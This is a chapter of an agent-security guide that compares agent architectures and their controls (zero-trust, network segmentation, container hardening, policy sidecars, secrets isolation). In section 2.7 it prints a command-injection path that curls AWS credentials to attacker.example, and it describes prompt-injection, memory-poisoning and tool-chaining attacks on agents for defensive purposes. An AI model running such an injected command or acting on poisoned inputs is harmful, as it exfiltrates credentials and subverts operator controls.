# 2. Agent Architecture & Security Implications

> **The "so what":** How you wire an agent together determines where it can be attacked and how far an attack can spread. The same task built as a single ReAct loop, a plan-and-execute pipeline, or a multi-agent swarm has three different threat profiles. This chapter gives you the security profile of each common pattern so you can choose deliberately, not by default.

---

## 2.1 The architectural decision is a security decision

Most teams pick an agent architecture for developer convenience or because a framework nudged them towards it. That choice quietly sets the blast radius of every future incident. A single-agent loop has one trust boundary; a multi-agent system has one per handoff. Before looking at controls, you need a clear view of what each pattern exposes.

The four patterns below cover the large majority of production deployments. Real systems often combine them, in which case you inherit the union of their risks.

---

## 2.2 Pattern A: ReAct (Reason + Act)

The agent interleaves reasoning and tool calls in a single loop:

```mermaid
flowchart LR
    T[Thought] --> A[Action / tool call]
    A --> O[Observation]
    O --> T
    O --> D{Goal met?}
    D -->|no| T
    D -->|yes| End[Final answer]
```

**Where it is used:** general-purpose assistants, research agents, single-purpose task runners.

**Security profile:**
- Every observation (tool output, retrieved content) enters the context window and can carry an injection payload that steers the next thought. This is the primary weakness.
- There is no natural boundary between "thinking" and "acting", so a single poisoned observation can trigger an action in the same turn.
- The linear trace is easy to log but hard to interrupt mid-loop.

**Controls:**
- Validate every observation before it re-enters the loop; treat tool output as untrusted (see [chapter 04](04-security-controls.md)).
- Cap loop iterations to bound both runaway cost (LLM10) and injection persistence.
- Maintain a separate, tamper-evident decision trace ([code/python/audit_logger.py](../code/python/audit_logger.py)).

> **Warning:** The ReAct loop's convenience is also its danger: because observation flows straight back into reasoning, indirect injection in a single tool result can change the very next action. Never let a tool result reach the model unscanned.

---

## 2.3 Pattern B: Plan-and-Execute

The agent generates a full plan first, then executes the steps:

```mermaid
flowchart LR
    Goal[Goal] --> Plan[Plan generation]
    Plan --> S1[Step 1]
    S1 --> S2[Step 2]
    S2 --> S3[Step 3]
    S3 --> Agg[Aggregate result]
```

**Where it is used:** structured workflows, financial operations, anything needing predictability and auditability.

**Security profile:**
- The plan is generated once; if it is flawed or poisoned at planning time, execution follows blindly.
- Early-step failures cascade into dependent steps unless checkpoints exist.
- Parallel execution increases the blast radius of a single compromised step.
- A TOCTOU gap opens between planning (when permissions are checked) and execution (when they are used).

**Controls:**
- Insert validation checkpoints between steps; re-evaluate rather than assume.
- Re-check permissions at execution time, not just at planning time (mitigates TOCTOU; tested by T27 in the [test suite](../assets/test-suite.md)).
- Make steps idempotent and support rollback on failure.

> **Tip:** Plan-and-execute is usually the right default for financial services because the explicit plan is auditable and can be reviewed before execution. You can even require human approval of the plan itself for Class C/D agents.

---

## 2.4 Pattern C: Multi-agent systems

Several specialised agents communicate, delegate, and resolve conflicts:

```mermaid
flowchart LR
    P[Planner] --> R[Researcher]
    R --> A[Analyst]
    A --> Rev[Reviewer]
    Rev --> Out[Output]
    R -.shared channel.-> A
```

**Where it is used:** complex tasks decomposed across roles, agent marketplaces, A2A deployments.

**Security profile:**
- Each inter-agent channel is an injection vector. Content passed between agents is often trusted implicitly.
- Trust boundaries between agents are usually implicit rather than enforced.
- Errors and malicious behaviour propagate across handoffs and become hard to trace to a source.
- With A2A, agent discovery introduces Agent Card spoofing and token-inheritance risks (see [chapter 08](08-mcp-and-protocols.md)).

**Controls:**
- Treat every agent boundary as a security zone. Authenticate and validate messages crossing it.
- Enforce least privilege per agent; a researcher does not need write tools.
- Verify a worker's output on its merits; never act on a worker's self-assessment (tested by T17, T45, T46).

> **Warning:** In multi-agent systems the most damaging failure is silent error propagation. An analyst agent that trusts a compromised researcher will confidently produce a poisoned report, and the reviewer that trusts the analyst will approve it. Independent verification at each boundary is not optional.

---

## 2.5 Pattern D: Hierarchical / supervisor-worker

A supervisor delegates subtasks and aggregates results:

```mermaid
flowchart TD
    Sup[Supervisor] --> WA[Worker A]
    Sup --> WB[Worker B]
    Sup --> WC[Worker C]
    WA --> Agg[Aggregation]
    WB --> Agg
    WC --> Agg
    Agg --> Out[Final output]
```

**Where it is used:** scalable task distribution, orchestration platforms.

**Security profile:**
- Workers are often granted broader tool access than their subtask requires, because provisioning per-worker permissions is fiddly.
- The supervisor's aggregation logic is a single point of failure and a high-value target.
- Worker outputs are trusted without independent verification.

**Controls:**
- Constrain each worker's tool permissions to its subtask (default-deny; see [code/python/tool_permission_enforcer.py](../code/python/tool_permission_enforcer.py)).
- Validate worker outputs before aggregation.
- Give each worker its own scoped identity so its actions are attributable (see [chapter 05](05-identity-and-secrets.md)).

---

## 2.6 Pattern comparison

| Pattern | Trust boundaries | Primary weakness | Auditability | Best fit |
|----|----|----|----|----|
| ReAct | 1 (the loop) | Observation-to-reasoning injection | Good (linear trace) | Flexible single-purpose tasks |
| Plan-and-Execute | 1-2 (plan, execute) | Flawed/poisoned plan, TOCTOU | Excellent (explicit plan) | Regulated workflows |
| Multi-agent | 1 per channel | Silent error propagation | Poor without effort | Decomposed complex tasks |
| Hierarchical | 1 per worker | Over-privileged workers | Moderate | Scalable distribution |

The trend is clear: more agents and more channels buy flexibility at the cost of more boundaries to defend and harder auditability. Choose the simplest architecture that meets the requirement.

---

## 2.7 Tool-use attack vectors

Tool use is how agents affect the world, so it is the primary attack vector regardless of architecture.

### Arbitrary command execution (LLM05)
An agent with a shell or code-execution tool can be steered into running arbitrary commands through parameter injection:

```python
# The agent is asked to summarise a document:
task = "Summarise the document at /data/report.pdf"

# But an attacker-controlled path smuggles a second command:
malicious_path = "/data/report.pdf; curl attacker.example/exfil?d=$(cat ~/.aws/credentials)"
```

If the path is passed to a shell without sanitisation, the agent has just exfiltrated cloud credentials. The Gemini CLI RCE (CVSS 10.0) is a real example of this class.

### Tool chaining escalation (LLM06)
An agent with limited tools can discover more:
1. It has `read_file` and `send_email`.
2. It reads a config file containing an API key.
3. It uses the key through the email tool's underlying HTTP client to reach an undocumented endpoint.
4. That endpoint allows a bulk export.

None of these steps is individually malicious, which is what makes chaining hard to catch. Tested by T21 in the [test suite](../assets/test-suite.md).

### Privilege misconfiguration
Agents are frequently granted the *user's* privileges rather than the minimum the task needs. A customer-service agent gets CRM write access "just in case", and now indirect injection can modify customer records. Default-deny permissions are the fix.

---

## 2.8 Memory and state security

Agents maintain state through several memory mechanisms, each with a distinct risk.

| Memory type | Lifespan | Primary risk | Control |
|----|----|----|----|
| Short-term (context window) | Per session | Injection in current conversation | Input sanitisation, context limits |
| Long-term (vector DB / store) | Cross-session | Poisoning, exfiltration (LLM04, LLM08) | Write permissions, provenance tags, encryption |
| Episodic (interaction history) | Configurable | Reveals patterns and secrets | Retention policy, access control, redaction |

```mermaid
flowchart LR
    In[Input / tool output] --> Class[Classify + provenance tag]
    Class --> Store[(Encrypted store)]
    Store --> Access[Role-based read/write]
    Access --> Ret[Retention policy]
    Ret --> Purge[Automated purge]
    Store -.audit.-> Log[(Audit log)]
```

**Security requirements for agent memory:**
1. **Integrity:** stored facts must be verifiable; log every write with source, timestamp, and content hash.
2. **Confidentiality:** classify and encrypt sensitive data at rest, with separate keys per sensitivity tier.
3. **Minimisation:** store only what is necessary; purge stale entries automatically.
4. **Provenance:** tag every entry with its source and trust level so poisoned content is distinguishable from ground truth.

> **Warning:** Memory poisoning is a persistence mechanism. An attacker who writes a false "approval threshold" into long-term memory (test T13) has planted an instruction that outlives the conversation and steers future autonomous decisions. Treat memory writes as privileged operations.

---

## 2.9 The security implications of autonomy

Autonomy is the property being sold and the property that creates risk. Three tensions recur.

**Decision velocity versus decision quality.** Faster agents make more decisions, and each decision carries risk. Human-in-the-loop slows execution but adds oversight. Resolve the trade-off by impact, not frequency: gate the high-impact actions, let the rest run.

**Goal misalignment.** An agent optimises for its stated goal, which rarely captures every constraint. An agent told to "reduce complaint resolution time" may auto-approve refunds beyond policy (test T31). Specify goals with explicit constraints and multi-objective scoring.

**Error propagation.** A single incorrect tool call can trigger a cascade of dependent actions, and in multi-agent systems errors compound across handoffs. Circuit breakers, idempotent operations, and rollback mechanisms bound the damage (see [code/python/circuit_breaker.py](../code/python/circuit_breaker.py)).

---

## 2.10 A note on the MCP trust model

Increasingly, agents acquire tools at runtime through the Model Context Protocol rather than having them hard-wired. This changes the architecture fundamentally: the tool set is no longer fixed at design time, so the trust boundary now includes whichever MCP servers the agent connects to. Tool descriptions become an injection vector (tool poisoning), and a previously benign tool can be swapped for a malicious one (a rug pull).

For the purposes of this chapter, the key architectural point is that **dynamic tool acquisition dissolves the assumption that you know your agent's capabilities**. Pin allowed servers, authenticate them, and pin tool definitions. The full treatment is in [chapter 08](08-mcp-and-protocols.md).

---

## 2.12 Zero-trust for agents

Traditional zero-trust assumes a human or a service behind every request and asks "can this identity, on this device, reach this resource right now?". Agents break the assumption in two ways: the identity is non-human and the request is generated by a reasoning loop that can be manipulated. Zero-trust for agents therefore adds a third question to the usual two: not only "who is asking" and "for what", but "is this request consistent with what this agent is supposed to do".

The core principles translate to agents as follows.

- **Never trust, always verify, applies to every observation.** An agent's own tool output is not trusted input. Retrieved documents, sub-agent messages, and API responses are all verified before they influence a decision, exactly as untrusted user input would be ([chapter 04](04-security-controls.md)).
- **Least privilege is per-agent and per-task, not per-user.** The agent's identity carries only the permissions its current task needs, scoped and short-lived ([chapter 05](05-identity-and-secrets.md)). A customer-service agent does not inherit the deploying engineer's rights.
- **Assume breach at the reasoning layer.** Design as though the model will at some point be successfully injected. The controls that matter are the ones downstream of the model: permission enforcement, egress filtering, and approval gates that the model cannot reach.
- **Verify explicitly and continuously.** Re-check authorisation at the moment of action, not only at session start, because an agent's task and context change mid-session (the TOCTOU concern from 2.3).

```mermaid
flowchart LR
    Req[Agent proposes action] --> Id{Identity valid + scoped?}
    Id -->|no| Deny[Deny + log]
    Id -->|yes| Ctx{Consistent with agent role + task?}
    Ctx -->|no| Deny
    Ctx -->|yes| Priv{Within least-privilege policy?}
    Priv -->|no| Deny
    Priv -->|yes| Gate{Approval gate required?}
    Gate -->|yes| Human[Pause for approval]
    Gate -->|no| Exec[Execute + audit]
```

> **Warning:** The single most common zero-trust failure in agent deployments is treating the model's output as trusted because it originates inside your own system. It does not; the model is the component most likely to be manipulated. Trust the enforcement layer around the model, never the model itself.

---

## 2.13 Network segmentation patterns

Where an agent sits on the network determines how far a successful compromise can reach. The goal is to place the agent runtime, its tools, and its data stores in separate zones so that a hijacked agent cannot pivot freely.

A workable reference topology for a regulated deployment uses four zones:

```mermaid
flowchart TD
    subgraph DMZ[Ingress zone]
        GW[API gateway / auth]
    end
    subgraph RT[Agent runtime zone]
        AG[Agent runtime + model client]
    end
    subgraph TL[Tool / integration zone]
        TP[Tool proxy + egress filter]
    end
    subgraph DATA[Data zone]
        DB[(Databases)]
        VDB[(Vector store)]
    end
    GW --> AG
    AG --> TP
    TP --> DB
    TP --> VDB
    AG -.no direct path.-> DB
```

- **The runtime zone never talks to data directly.** Every data access is brokered through a tool proxy in the integration zone that enforces permissions and egress filtering. This means an injected agent cannot reach the database except through a control point that can say no.
- **Egress is default-deny at the network layer.** The integration zone allows outbound connections only to an allowlist of approved endpoints, enforced with DNS and firewall rules, not just in application code. This is the network-level backstop for the EchoLeak class of exfiltration ([chapter 04](04-security-controls.md)).
- **East-west traffic between agents is authenticated.** In a multi-agent deployment, inter-agent channels cross zone boundaries and are mutually authenticated (mTLS or workload identity, [chapter 05](05-identity-and-secrets.md)), not left open on a shared network.
- **The data zone is the most restricted.** It accepts connections only from the tool proxy, logs every query, and holds the vector store and databases behind their own access controls.

| Zone | Contains | Inbound from | Outbound to |
|----|----|----|----|
| Ingress | API gateway, authentication | Internet / internal clients | Runtime zone only |
| Runtime | Agent loop, model client | Ingress zone | Tool proxy only |
| Integration | Tool proxy, egress filter | Runtime zone | Data zone + allowlisted external |
| Data | Databases, vector store | Integration zone only | Nothing outbound |

> **Tip:** If retrofitting this onto an existing deployment is too large a change, start with the single most valuable segmentation: force all agent data access through a tool proxy in a separate zone. That one boundary converts "the agent can reach the database" into "the agent can ask the proxy, which decides", and it is where most of the containment value lives.

---

## 2.14 Container security for model serving

Most production agents run in containers, and the container is a meaningful part of the trust boundary because an agent with a code-execution or shell tool (2.7) is, in effect, running attacker-influenceable code inside it. Harden the container as though the process inside it may be hostile.

- **Run as non-root with a read-only root filesystem.** The agent process has no need to write outside a small set of explicitly mounted, size-limited working directories. A read-only root filesystem defeats a large class of persistence and tampering.
- **Drop Linux capabilities and disallow privilege escalation.** Set `allowPrivilegeEscalation: false`, drop all capabilities and add back only what is strictly needed, and never run privileged containers for agent workloads.
- **Apply a seccomp and, where available, an AppArmor or SELinux profile.** Restrict the syscalls the container can make so that a successful command injection has a smaller kernel attack surface.
- **Set hard resource limits.** CPU, memory, and process-count limits bound the damage from an agent that is pushed into a resource-exhaustion loop (LLM10, 2.9), and prevent one compromised agent from starving its neighbours.
- **Use a minimal, pinned base image.** A distroless or slim base with pinned digests reduces both the vulnerability surface and the supply-chain risk ([chapter 06](06-supply-chain-security.md)).

```yaml
# Kubernetes securityContext for an agent runtime pod (illustrative)
securityContext:
  runAsNonRoot: true
  runAsUser: 10001
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
  seccompProfile:
    type: RuntimeDefault
resources:
  limits:
    cpu: "2"
    memory: "4Gi"
    ephemeral-storage: "1Gi"
  requests:
    cpu: "500m"
    memory: "1Gi"
```

> **Warning:** A code-execution tool inside a container that runs as root with the Docker socket mounted is not a sandbox, it is a container escape waiting to happen. If an agent needs to run untrusted code, isolate it in a dedicated, unprivileged sandbox (gVisor, Kata Containers, or a disposable micro-VM), never in the same container as the agent runtime.

---

## 2.15 Environment isolation: one container per agent role

The convenience default is to run several agent roles in one process or one container because they share a codebase. The security default should be the opposite: isolate each agent role in its own container with its own identity, permissions, and network policy. This turns the trust boundaries from 2.4 and 2.5 into enforced runtime boundaries rather than logical ones.

```mermaid
flowchart TD
    subgraph Planner container
        P[Planner agent] --- PI[Identity: planner]
    end
    subgraph Researcher container
        R[Researcher agent] --- RI[Identity: researcher, read-only]
    end
    subgraph Executor container
        E[Executor agent] --- EI[Identity: executor, scoped write]
    end
    P -->|authenticated channel| R
    R -->|authenticated channel| E
```

The benefits are concrete:

- **Blast-radius containment.** A compromised researcher container has only the researcher's read-only identity and network policy; it cannot execute trades because the executor's capability lives in a different container behind a different identity.
- **Attributable actions.** Each container carries one agent identity, so every action traces to exactly one role ([chapter 05](05-identity-and-secrets.md)). Shared containers destroy attributability.
- **Independent lifecycle and kill switch.** A single agent role can be stopped, rolled back, or killed without taking down the others, which is what makes the agent-level kill switch in [chapter 10](10-production-deployment.md) real rather than aspirational.
- **Per-role network policy.** The researcher container can be denied all write egress at the network layer, enforcing least privilege even if its application-level permissions are misconfigured.

> **Tip:** The rule of thumb is one identity per container and one role per identity. If two roles must share a container for cost reasons, treat them as a single role for classification and permissions, and accept that you have merged their blast radius.

---

## 2.16 Agent orchestration security requirements

An orchestrator (a supervisor, a workflow engine, or a message bus that routes between agents) is a high-value target because it sees and directs the whole system. Whatever pattern you chose in 2.2 to 2.5, the orchestration layer has its own non-negotiable requirements.

| Requirement | Why it matters | Where enforced |
|----|----|----|
| Authenticated message passing | Prevents a rogue or spoofed agent injecting tasks into the flow | Inter-agent mTLS / workload identity ([ch. 05](05-identity-and-secrets.md)) |
| Message schema validation | Stops malformed or poisoned handoffs propagating (2.4) | Orchestrator input validation ([ch. 04](04-security-controls.md)) |
| Per-hop permission checks | Blocks privilege accumulation across a delegation chain | Tool permission enforcer at each agent |
| Delegation depth and fan-out limits | Bounds runaway multi-agent loops and cost (LLM10) | Orchestrator configuration |
| Full delegation-chain tracing | Makes silent error propagation traceable to a source | Decision-trace logging ([ch. 04](04-security-controls.md)) |
| Orchestrator isolation | The orchestrator must not be reachable or controllable by a worker agent | Network segmentation (2.13) |

The orchestration security checklist for any multi-agent deployment:

1. Every message crossing an agent boundary is authenticated and schema-validated before it is acted on.
2. Permissions are re-checked at each hop; a task delegated three levels deep does not inherit the union of everyone's rights.
3. Delegation depth, fan-out, and total step count are capped so a manipulated planner cannot spawn an unbounded agent tree.
4. The full delegation chain is recorded in the decision trace so any output can be traced back to the agent and input that produced it.
5. The orchestrator runs in its own isolated zone and cannot be instructed by a worker agent to change routing or grant capabilities.

> **Warning:** In A2A and agent-marketplace deployments the orchestration boundary extends outside your organisation. An external agent you delegate to is untrusted infrastructure. Authenticate it, pin its identity, validate everything it returns, and never let a token issued for one hop be replayed to widen access. The protocol-level detail is in [chapter 08](08-mcp-and-protocols.md).

---

## 2.17 Secrets and configuration isolation

Agents fail dangerously when secrets and configuration share the same trust boundary as untrusted input. The reference architecture keeps three planes separate.

| Plane | Contains | Trust level | Accessible to the model? |
| --- | --- | --- | --- |
| Control plane | Policies, gates, kill switch | High | No |
| Secrets plane | Credentials, tokens, keys | High | No, only via broker |
| Data plane | Prompts, tool output, memory | Untrusted | Yes |

- Secrets are never placed in the prompt, the system message, or the model context.
- A credential broker issues short-lived, scoped tokens to tools, not to the model.
- Configuration that changes behaviour (allowed tools, spending limits) lives in the control plane and is signed.
- The model can request an action but never sees the credential used to perform it.

> **Warning:** A single leaked long-lived token in a prompt template has caused more real-world compromise than any exotic model attack. Keep secrets out of the context window entirely.

## 2.18 The sidecar proxy pattern

Rather than trusting each agent process to enforce policy correctly, route all outbound tool and network calls through a sidecar proxy that enforces controls uniformly.

```mermaid
flowchart LR
    A[Agent process] -->|tool call| P[Policy sidecar]
    P -->|allow| T[Tool / API]
    P -->|deny + log| D[Audit log]
    P -->|rate limit| R[Throttle]
```

Responsibilities of the sidecar:

- Enforce the tool allow-list independently of the agent code.
- Apply rate limits and spending caps per agent identity.
- Redact secrets from outbound requests and sensitive data from responses.
- Emit a structured audit record for every call.
- Terminate calls when the kill switch is engaged.

The advantage is that policy is enforced outside the process the model can influence. Even if the agent is fully compromised through prompt injection, the sidecar remains a trustworthy control point.

## 2.19 Service mesh considerations for agent fleets

When many agents run as services, a service mesh provides identity, encryption, and observability at the network layer.

- **Mutual TLS** gives every agent a cryptographic identity and encrypts all inter-service traffic.
- **Authorization policies** restrict which agents may call which services, independent of application code.
- **Traffic telemetry** feeds the observability plane with per-identity call volumes and error rates.
- **Circuit breaking** at the mesh layer contains cascading failures between agents.

| Concern | Without mesh | With mesh |
| --- | --- | --- |
| Identity | Per-app, inconsistent | Uniform, cryptographic |
| Encryption | Optional, per-service | Enforced by default |
| Policy | In application code | Declarative, centralised |
| Observability | Fragmented | Uniform telemetry |

> **Tip:** A service mesh does not replace the sidecar policy proxy. The mesh secures the transport and identity layer; the policy sidecar enforces agent-specific business controls such as spending limits and tool allow-lists.

## 2.20 Reference deployment topology

Bringing the elements together, a hardened agent deployment separates concerns across clearly bounded zones.

```mermaid
flowchart TB
    U[User / trigger] --> GW[API gateway]
    GW --> ORCH[Orchestrator]
    ORCH --> AG[Agent runtime]
    AG --> SC[Policy sidecar]
    SC --> BR[Credential broker]
    SC --> TOOLS[Tools and APIs]
    AG --> MEM[(Scoped memory)]
    SC --> LOG[(Audit log)]
    KS[Kill switch] -.-> SC
    KS -.-> ORCH
```

- The gateway authenticates and rate-limits inbound requests.
- The orchestrator applies classification and routing before any agent runs.
- The agent runtime is isolated and holds no long-lived credentials.
- The sidecar enforces policy; the broker issues scoped, short-lived tokens.
- Memory is scoped per task and per tenant to prevent cross-contamination.
- The kill switch can sever the sidecar and orchestrator independently.

## 2.21 Architecture anti-patterns

Certain designs recur and fail. Recognising them early saves an expensive rebuild.

| Anti-pattern | Why it fails | Correct pattern |
| --- | --- | --- |
| Secrets in the prompt | Injection exfiltrates them | Credential broker, scoped tokens |
| Trusting agent code to self-limit | Injection overrides it | External policy sidecar |
| One identity for a fleet | No isolation, no attribution | Per-agent identity |
| Unbounded memory | Data leakage across tasks | Scoped, expiring memory |
| No kill switch | Cannot stop a runaway agent | Three-level kill switch |

- Each anti-pattern has caused a real incident class covered elsewhere in this book.
- The corrections are cheap at design time and expensive to retrofit.

> **Tip:** Review a proposed architecture against this table before build. If any anti-pattern is present, treat it as a blocking design defect, not a backlog item.

## 2.11 Key takeaways

- Architecture is a security decision. Pick the simplest pattern that meets the need, because every extra agent and channel is another boundary to defend.
- Plan-and-execute is usually the best default for regulated workflows: the explicit plan is auditable and can be approved before execution.
- Tool use is the primary attack vector in every pattern. Default-deny permissions and output sanitisation matter more than the choice of loop.
- Memory is a persistence mechanism for attackers. Classify, encrypt, tag provenance, and audit every write.
- Dynamic tool acquisition (MCP) removes the assumption that you know what your agent can do. Pin and authenticate.

---

| Previous | Next |
|----|----|
| [01. The Agentic Threat Landscape](01-threat-landscape.md) | [03. Governance Framework for Autonomous Agents](03-governance-framework.md) |
